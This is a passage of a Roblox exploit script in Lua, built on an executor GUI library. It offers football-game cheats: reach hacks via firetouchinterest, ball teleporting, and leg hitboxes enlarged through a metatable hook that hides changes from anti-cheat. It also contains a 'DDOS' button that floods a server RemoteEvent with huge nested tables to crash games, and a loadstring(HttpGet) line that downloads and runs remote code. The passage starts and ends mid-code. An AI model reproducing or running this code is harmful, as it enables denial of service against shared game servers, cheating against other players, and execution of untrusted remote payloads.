                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)


setsimulationradius(math.huge, math.huge)

end)




--------------------

local Section = Tab:NewSection("BCL League")
Section:NewButton("Enable", "ButtonInfo", function()
_G.BallName = "CCA"
_G.Magnitude = 6
_G.Enabled = true


-- DONT TOUCH ANYTHING BELOW THIS

_G.Path = nil

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

local leg = game.Players.LocalPlayer.Character["Right Leg"]
local left = game.Players.LocalPlayer.Character["Left Arm"]
local arm = game.Players.LocalPlayer.Character["Right Arm"]
local torso = game.Players.LocalPlayer.Character.Torso
local head = game.Players.LocalPlayer.Character.Head


local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
mouse.KeyDown:connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
            mouse.Button1Down:Connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)


setsimulationradius(math.huge, math.huge)

end)

------------------------------------------------------------------------

Section:NewButton("Disable", "ButtonInfo", function()
_G.BallName = "CCA"
_G.Magnitude = 0
_G.Enabled = true


-- DONT TOUCH ANYTHING BELOW THIS

_G.Path = nil

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

local leg = game.Players.LocalPlayer.Character["Right Leg"]
local left = game.Players.LocalPlayer.Character["Left Arm"]
local arm = game.Players.LocalPlayer.Character["Right Arm"]
local torso = game.Players.LocalPlayer.Character.Torso
local head = game.Players.LocalPlayer.Character.Head


local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
mouse.KeyDown:connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
            mouse.Button1Down:Connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)


setsimulationradius(math.huge, math.huge)

end)


---------------------------------------------------------------------------
local Tab = Window:NewTab("Ball TP")

local Section = Tab:NewSection("Ball TP")
Section:NewButton("Execute", "ButtonInfo", function()
local Input = game:GetService('UserInputService');
local Players = game:GetService('Players')
local Player = Players['LocalPlayer'];
local Key = 'K';

while wait() do
  if Input:IsKeyDown(Enum.KeyCode[Key]) then
    local Char = Player.Character
    local HRP = Char and Char:FindFirstChild('HumanoidRootPart')
    local Ball = HRP and workspace.Balls:FindFirstChild('TPS')
    local Mag = Ball and (function(p, p1)
      return ((p.Position - p1.Position).magnitude)
    end)

    if Mag then
      local pos = Mag(HRP, Ball)
      repeat wait()
        pos = Mag(HRP, Ball)
      until (not Input:IsKeyDown(Enum.KeyCode[Key])) or (pos <= 150)
      Ball.CFrame = HRP.CFrame
    end
  end
end
end)

local Section = Tab:NewSection("u cant disable if u execute it")
local Section = Tab:NewSection("press k to use")
---
-----
local Tab = Window:NewTab("DDOS")
local Section = Tab:NewSection("Ddos Merchant")
Section:NewButton("Server Fucker", "LT.#9171", function()
    print("Clicked")
_G.on = true --// toggle

while wait(1.3) do --// don't change it's the best
   if _G.on == true then
   game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
   local function getmaxvalue(val)
      local mainvalueifonetable = 499999
      if type(val) ~= "number" then
          return nil
      end
      local calculateperfectval = (mainvalueifonetable/(val+2))
      return calculateperfectval
   end

   local function bomb(tableincrease, tries)
    local maintable = {}
    local spammedtable = {}

    table.insert(spammedtable, {})
    z = spammedtable[1]

    for i = 1, tableincrease do
       local tableins = {}
       table.insert(z, tableins)
       z = tableins
    end

    local calculatemax = getmaxvalue(tableincrease)
    local maximum

    if calculatemax then
        maximum = calculatemax
        else
        maximum = 10000
    end

    for i = 1, maximum do
        table.insert(maintable, spammedtable)
    end

    for i = 1, tries do
        game.RobloxReplicatedStorage.UpdatePlayerBlockList:FireServer(maintable)
    end
   end

   bomb(250, 2) --// change values if client crashes
end
   end
end)

------
------
------
------
------

local Tab = Window:NewTab("ALL BIGFOOTS")

local Section = Tab:NewSection("4-A-SIDE BIGFOOT")
Section:NewButton("Execute", "ButtonInfo", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/3kizy/sd/main/README.md", true))()
end)

---------------

local Section = Tab:NewSection("UFA BIGFOOT")
Section:NewButton("Execute", "ButtonInfo", function()
-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local Main = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local TextButton = Instance.new("TextButton")
local UICorner_3 = Instance.new("UICorner")
local TextButton_2 = Instance.new("TextButton")
local UICorner_4 = Instance.new("UICorner")
local TextButton_3 = Instance.new("TextButton")
local UICorner_5 = Instance.new("UICorner")
local TextButton_4 = Instance.new("TextButton")
local UICorner_6 = Instance.new("UICorner")
local TextButton_5 = Instance.new("TextButton")
local UICorner_7 = Instance.new("UICorner")
local TextButton_6 = Instance.new("TextButton")
local UICorner_8 = Instance.new("UICorner")
local TextButton_7 = Instance.new("TextButton")
local UICorner_9 = Instance.new("UICorner")
local TextButton_8 = Instance.new("TextButton")
local UICorner_10 = Instance.new("UICorner")
local TextButton_9 = Instance.new("TextButton")
local UICorner_11 = Instance.new("UICorner")
local TextButton_10 = Instance.new("TextButton")
local UICorner_12 = Instance.new("UICorner")
local TextButton_11 = Instance.new("TextButton")
local UICorner_13 = Instance.new("UICorner")
local TextButton_12 = Instance.new("TextButton")
local UICorner_14 = Instance.new("UICorner")
local TextButton_13 = Instance.new("TextButton")
local UICorner_15 = Instance.new("UICorner")
local TextButton_14 = Instance.new("TextButton")
local UICorner_16 = Instance.new("UICorner")
local Frame_2 = Instance.new("Frame")
local UICorner_17 = Instance.new("UICorner")
local TextButton_15 = Instance.new("TextButton")
local UICorner_18 = Instance.new("UICorner")
local TextButton_16 = Instance.new("TextButton")
local UICorner_19 = Instance.new("UICorner")
local TextButton_17 = Instance.new("TextButton")
local UICorner_20 = Instance.new("UICorner")
local shadowHolder = Instance.new("Frame")
local umbraShadow = Instance.new("ImageLabel")
local penumbraShadow = Instance.new("ImageLabel")
local ambientShadow = Instance.new("ImageLabel")
local TextLabel = Instance.new("TextLabel")
local Credits = Instance.new("Frame")
local UICorner_21 = Instance.new("UICorner")
local TextButton_18 = Instance.new("TextButton")
local UICorner_22 = Instance.new("UICorner")
local TextButton_19 = Instance.new("TextButton")
local UICorner_23 = Instance.new("UICorner")
local TextButton_20 = Instance.new("TextButton")
local UICorner_24 = Instance.new("UICorner")
local TextButton_21 = Instance.new("TextButton")
local UICorner_25 = Instance.new("UICorner")
local TextButton_22 = Instance.new("TextButton")
local UICorner_26 = Instance.new("UICorner")
local TextButton_23 = Instance.new("TextButton")
local UICorner_27 = Instance.new("UICorner")
local Information = Instance.new("Frame")
local UICorner_28 = Instance.new("UICorner")
local TextButton_24 = Instance.new("TextButton")
local UICorner_29 = Instance.new("UICorner")
local TextButton_25 = Instance.new("TextButton")
local UICorner_30 = Instance.new("UICorner")
local TextButton_26 = Instance.new("TextButton")
local UICorner_31 = Instance.new("UICorner")
local TextButton_27 = Instance.new("TextButton")
local UICorner_32 = Instance.new("UICorner")
local TextButton_28 = Instance.new("TextButton")
local UICorner_33 = Instance.new("UICorner")
local TextButton_29 = Instance.new("TextButton")
local UICorner_34 = Instance.new("UICorner")
local TextLabel_2 = Instance.new("TextLabel")
local TextLabel_3 = Instance.new("TextLabel")
local UICorner_35 = Instance.new("UICorner")
local TextLabel_4 = Instance.new("TextLabel")
local TextLabel_5 = Instance.new("TextLabel")
local UICorner_36 = Instance.new("UICorner")

--Properties:

ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global

Frame.Parent = ScreenGui


UICorner.CornerRadius = UDim.new(0, 3)
UICorner.Parent = Frame

Main.Name = "Main"
Main.Parent = Frame
Main.BackgroundColor3 = Color3.fromRGB(1000, 36, 36)
Main.Position = UDim2.new(0.00142349559, 0, 0.274297148, 0)
Main.Size = UDim2.new(0, 0, 0, 0)

UICorner_2.CornerRadius = UDim.new(0, 3)
UICorner_2.Parent = Main

TextButton.Parent = Main
TextButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
TextButton.Position = UDim2.new(0, 800, 50, 70)
TextButton.Size = UDim2.new(0, 213, 0, 70)
TextButton.Font = Enum.Font.GothamBlack
TextButton.Text = "UFA BIGFOOT"
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextSize = 20.000

UICorner_3.Parent = TextButton



TextButton_17.Parent = Frame_2
TextButton_17.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
TextButton_17.Position = UDim2.new(0.1593981631, 0, 0.30107972, 0)
TextButton_17.Size = UDim2.new(0, 103, 0, 38)
TextButton_17.Font = Enum.Font.GothamBlack
TextButton_17.Text = "Information"
TextButton_17.TextColor3 = Color3.fromRGB(200, 255, 255)
TextButton_17.TextSize = 20.000

UICorner_20.CornerRadius = UDim.new(0, 3)
UICorner_20.Parent = TextButton_17

shadowHolder.Name = "shadowHolder"
shadowHolder.Parent = Frame
shadowHolder.BackgroundTransparency = 0.500
shadowHolder.Size = UDim2.new(1, 0, 0.409638554, 0)
shadowHolder.ZIndex = 5

umbraShadow.Name = "umbraShadow"
umbraShadow.Parent = shadowHolder
umbraShadow.AnchorPoint = Vector2.new(0.5, 0.5)
umbraShadow.BackgroundTransparency = 1.000
umbraShadow.Position = UDim2.new(0.5, 0, 0.5, 3)
umbraShadow.Size = UDim2.new(1, 1, 1, 3)
umbraShadow.Image = "rbxassetid://1316045217"
umbraShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
umbraShadow.ImageTransparency = 0.160
umbraShadow.ScaleType = Enum.ScaleType.Slice
umbraShadow.SliceCenter = Rect.new(10, 10, 118, 118)

penumbraShadow.Name = "penumbraShadow"
penumbraShadow.Parent = shadowHolder
penumbraShadow.AnchorPoint = Vector2.new(0.5, 0.5)
penumbraShadow.BackgroundTransparency = 1.000
penumbraShadow.Position = UDim2.new(0.5, 0, 0.5, 3)
penumbraShadow.Size = UDim2.new(1, 1, 1, 3)
penumbraShadow.Image = "rbxassetid://1316045217"
penumbraShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
penumbraShadow.ImageTransparency = 0.880
penumbraShadow.ScaleType = Enum.ScaleType.Slice
penumbraShadow.SliceCenter = Rect.new(10, 10, 118, 118)

ambientShadow.Name = "ambientShadow"
ambientShadow.Parent = shadowHolder
ambientShadow.AnchorPoint = Vector2.new(0.5, 0.5)
ambientShadow.BackgroundTransparency = 1.000
ambientShadow.Position = UDim2.new(0.501123726, 0, 0.474999994, 3)
ambientShadow.Size = UDim2.new(0.991011322, 3, 1.04999995, 3)
ambientShadow.Image = "rbxassetid://1316045217"
ambientShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
ambientShadow.ImageTransparency = 0.880
ambientShadow.ScaleType = Enum.ScaleType.Slice
ambientShadow.SliceCenter = Rect.new(10, 10, 118, 118)

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(-0.0267857146, 0, 0, 0)
TextLabel.Size = UDim2.new(0, 94, 0, 23)
TextLabel.Font = Enum.Font.GothamBold
TextLabel.Text = ""
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 25.000

Credits.Name = "Credits"
Credits.Parent = Frame
Credits.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
Credits.Position = UDim2.new(0, 0, 0.277108431, 0)
Credits.Size = UDim2.new(0, 543, 0, 372)
Credits.Visible = false

UICorner_21.CornerRadius = UDim.new(0, 3)
UICorner_21.Parent = Credits

TextButton_18.Parent = Credits
TextButton_18.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
TextButton_18.Position = UDim2.new(0.259970695, 0, 0.0569556877, 0)
TextButton_18.Size = UDim2.new(0, 381, 0, 38)
TextButton_18.Font = Enum.Font.GothamBlack
TextButton_18.Text = "Main dev: David De Gea#4581"
TextButton_18.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_18.TextSize = 14.000

UICorner_22.Parent = TextButton_18

TextButton_19.Parent = Credits
TextButton_19.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
TextButton_19.Position = UDim2.new(0.259970695, 0, 0.193665951, 0)
TextButton_19.Size = UDim2.new(0, 381, 0, 38)
TextButton_19.Font = Enum.Font.GothamBlack
TextButton_19.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_19.TextSize = 14.000

UICorner_23.Parent = TextButton_19

TextButton_20.Parent = Credits
TextButton_20.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
TextButton_20.Position = UDim2.new(0.260420144, 0, 0.479643464, 0)
TextButton_20.Size = UDim2.new(0, 380, 0, 38)
TextButton_20.Font = Enum.Font.GothamBlack
TextButton_20.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_20.TextSize = 10.000

UICorner_24.Parent = TextButton_20

TextButton_21.Parent = Credits
TextButton_21.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
TextButton_21.Position = UDim2.new(0.258578479, 0, 0.33613947, 0)
TextButton_21.Size = UDim2.new(0, 381, 0, 38)
TextButton_21.Font = Enum.Font.GothamBlack
TextButton_21.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_21.TextSize = 14.000

UICorner_25.Parent = TextButton_21

TextButton_22.Parent = Credits
TextButton_22.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
TextButton_22.Position = UDim2.new(0.260420144, 0, 0.612421036, 0)
TextButton_22.Size = UDim2.new(0, 380, 0, 38)
TextButton_22.Font = Enum.Font.GothamBlack
TextButton_22.Text = "Join our discord! discord.gg/rj8PXHXmUe"
TextButton_22.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_22.TextSize = 10.000

UICorner_26.Parent = TextButton_22

TextButton_23.Parent = Credits
TextButton_23.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
TextButton_23.Position = UDim2.new(0.260420144, 0, 0.739835024, 0)
TextButton_23.Size = UDim2.new(0, 378, 0, 38)
TextButton_23.Font = Enum.Font.GothamBlack
TextButton_23.Text = "Copy Discord Link"
TextButton_23.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_23.TextSize = 14.000

UICorner_27.Parent = TextButton_23

Information.Name = "Information"
Information.Parent = Frame
Information.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
Information.Position = UDim2.new(0, 0, 0.277108431, 0)
Information.Size = UDim2.new(0, 542, 0, 371)
Information.Visible = false

UICorner_28.CornerRadius = UDim.new(0, 3)
UICorner_28.Parent = Information

TextButton_24.Parent = Information
TextButton_24.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
TextButton_24.Position = UDim2.new(0.278182626, 0, 0.0569701903, 0)
TextButton_24.Size = UDim2.new(0, 379, 0, 38)
TextButton_24.Font = Enum.Font.GothamBlack
TextButton_24.Text = "Press F for AC"
TextButton_24.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_24.TextSize = 14.000

UICorner_29.Parent = TextButton_24

TextButton_25.Parent = Information
TextButton_25.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
TextButton_25.Position = UDim2.new(0.278182626, 0, 0.190948814, 0)
TextButton_25.Size = UDim2.new(0, 379, 0, 38)
TextButton_25.Font = Enum.Font.GothamBlack
TextButton_25.Text = "Scripting Group: Avexcital Scripts"
TextButton_25.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_25.TextSize = 14.000


UICorner_31.Parent = TextButton_26

TextButton_27.Parent = Information
TextButton_27.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
TextButton_27.Position = UDim2.new(0.278182626, 0, 0.333371639, 0)
TextButton_27.Size = UDim2.new(0, 379, 0, 38)
TextButton_27.Font = Enum.Font.GothamBlack
TextButton_27.Text = "Comma (,) to close the GUI"
TextButton_27.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_27.TextSize = 14.000



UICorner_34.Parent = TextButton_29

TextLabel_2.Parent = Frame
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.BorderSizePixel = 0
TextLabel_2.Position = UDim2.new(-0.0267857146, 0, 0, 0)
TextLabel_2.Size = UDim2.new(0, 94, 0, 23)
TextLabel_2.Font = Enum.Font.GothamBold
TextLabel_2.Text = ""
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextSize = 25.000





-- Scripts:

local function EBAYR_fake_script() -- TextButton.LocalScript 
	local script = Instance.new('LocalScript', TextButton)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
	
	
	
	button.MouseButton1Click:Connect(function()
		if getgenv().MTAPIMutex~=nil then return end;local function a()if is_protosmasher_caller~=nil then return 0 end;if elysianexecute~=nil then return 1 end;if fullaccess~=nil then return 2 end;if Synapse~=nil then return 3 end;return 4 end;local function b()local c=a()if c==0 then return is_protosmasher_caller end;if c==1 or c==3 then return checkcaller end;if c==2 then return IsLevel7 end;return nil end;if a()==2 then error("mt-api: Exploit not supported")end;local d={}local e={}local f={}local g={}local h={}local i={}local j={}local k={}local function l()local m=a()local n=b()local o=getrawmetatable(game)if m==0 then make_writeable(o)elseif m==2 then fullaccess(o)else setreadonly(o,false)end;local p=o.__index;local q=o.__newindex;local r=o.__namecall;o.__index=newcclosure(function(s,t)if n()then return p(s,t)end;if d[s]and d[s][t]then local u=d[s][t]if u["IsCallback"]==true then return u["Value"](s)else return u["Value"]end end;if g[t]then local v=g[t]if v["IsCallback"]==true then return v["Value"](s)else return v["Value"]end end;if j[s]and j[s][t]then return k[s][t]end;return p(s,t)end)o.__newindex=newcclosure(function(w,x,y)if n()then return q(w,x,y)end;if e[w]and e[w][x]then local z=e[w][x]if z["Callback"]==nil then return else z["Callback"](w,y)return end end;if h[x]then local A=h[x]if A["Callback"]==nil then return else A["Callback"](w,y)return end end;if j[w]and j[w][x]then local B=j[w][x]if type(y)~=B["Type"]then error("bad argument #3 to '"..x.."' ("..B["Type"].." expected, got "..type(x)..")")end;k[w][x]=y;return end;return q(w,x,y)end)local C=isluau and isluau()or false;o.__namecall=newcclosure(function(D,...)local E={...}local F=C and getnamecallmethod()or table.remove(E)if n()then if F=="AddGetHook"then if#E<1 then error("mt-api: Invalid argument count")end;local G=E[1]local H=E[2]local I=E[3]if type(G)~="string"then error("mt-api: Invalid hook type")end;if not d[D]then d[D]={}end;if I==true and type(H)~="function"then error("mt-api: Invalid callback function")end;d[D][G]={Value=H,IsCallback=I}local J=function()d[D][G]=nil end;return{remove=J,Remove=J}end;if F=="AddGlobalGetHook"then local K=E[1]local L=E[2]local M=E[3]if type(K)~="string"then error("mt-api: Invalid hook type")end;if M==true and type(L)~="function"then error("mt-api: Invalid callback function")end;g[K]={Value=L,IsCallback=M}local N=function()g[K]=nil end;return{remove=N,Remove=N}end;if F=="AddSetHook"then if#E<1 then error("mt-api: Invalid argument count")end;local O=E[1]local P=E[2]if type(O)~="string"then error("mt-api: Invalid hook type")end;if not e[D]then e[D]={}end;if type(P)=="function"then e[D][O]={Callback=P}else e[D][O]={Callback=nil}end;local Q=function()e[D][O]=nil end;return{remove=Q,Remove=Q}end;if F=="AddGlobalSetHook"then if#E<1 then error("mt-api: Invalid argument count")end;local R=E[1]local S=E[2]if type(R)~="string"then error("mt-api: Invalid hook type")end;if type(S)=="function"then h[R]={Callback=S}else h[R]={Callback=nil}end;local T=function()h[R]=nil end;return{remove=T,Remove=T}end;if F=="AddCallHook"then if#E<2 then error("mt-api: Invalid argument count")end;local U=E[1]local V=E[2]if type(U)~="string"then error("mt-api: Invalid hook type")end;if type(V)~="function"then error("mt-api: Invalid argument #2 (not function)")end;if not f[D]then f[D]={}end;f[D][U]={Callback=V}local W=function()f[D][U]=nil end;return{remove=W,Remove=W}end;if F=="AddGlobalCallHook"then if#E<2 then error("mt-api: Invalid argument count")end;local X=E[1]local Y=E[2]if type(X)~="string"then error("mt-api: Invalid hook type")end;if type(Y)~="function"then error("mt-api: Invalid argument #2 (not function)")end;i[X]={Callback=Y}local Z=function()i[X]=nil end;return{remove=Z,Remove=Z}end;if F=="AddPropertyEmulator"then if#E<1 then error("mt-api: Invalid argument count")end;local _=E[1]if type(_)~="string"then error("mt-api: Invalid hook type")end;local a0=p(D,_)local a1=type(a0)if not j[D]then j[D]={}end;if not k[D]then k[D]={}end;j[D][_]={Type=a1}k[D][_]=p(D,_)local a2=function()j[D][_]=nil;k[D][_]=nil end;return{remove=a2,Remove=a2}end;return r(D,...)end;if f[D]and f[D][F]then local a3=f[D][F]return a3["Callback"](p(D,F),unpack(E))end;if i[F]then local a4=i[F]return a4["Callback"](D,p(D,F),unpack(E))end;return r(D,...)end)if m==0 then make_readonly(o)elseif m==2 then else setreadonly(o,true)end end;l()getgenv().MTAPIMutex=true
	
		game.Players.LocalPlayer.Character["Right Leg"]:AddPropertyEmulator("Size")
		wait(0.5)
		game.Players.LocalPlayer.Character["Right Leg"].Massless = true
		game.Players.LocalPlayer.Character["Right Leg"].Size = Vector3.new (12.3, 2.11, 10.2)
		game.Players.LocalPlayer.Character["Right Leg"].Transparency = 0.9
	end)
end
coroutine.wrap(EBAYR_fake_script)()
local function DTNR_fake_script() -- TextButton_2.LocalScript 
	local script = Instance.new('LocalScript', TextButton_2)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
	
	
	
	button.MouseButton1Click:Connect(function()
